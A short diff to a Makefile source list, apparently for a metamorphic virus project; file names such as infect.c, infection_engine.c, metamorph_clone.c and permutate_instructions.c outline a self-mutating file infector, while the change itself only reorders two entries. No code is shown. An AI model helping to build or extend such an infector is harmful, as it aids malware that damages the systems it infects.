@@ -11,7 +11,6 @@ SRC =	loader.s                       \
 	virus/virus.c                  \
 	virus/accessors.c              \
 	virus/adjust_references.c      \
-	virus/not_infected.c           \
 	virus/change_entry.c           \
 	virus/copy_virus_to_clone.c    \
 	virus/copy_client_to_clone.c   \
@@ -26,8 +25,10 @@ SRC =	loader.s                       \
 	virus/generate_seed.c          \
 	virus/infect.c                 \
 	virus/infection_engine.c       \
+	virus/jumps.c                  \
 	virus/log.c                    \
 	virus/metamorph_clone.c        \
+	virus/not_infected.c           \
 	virus/permutate_blocks.c       \
 	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
@@ -35,7 +36,6 @@ SRC =	loader.s                       \
 	virus/setup_virus_header.c     \
 	virus/syscall.c                \
 	virus/utils.c                  \
-	virus/jumps.c                  \
 	start.c
 
 CC = clang
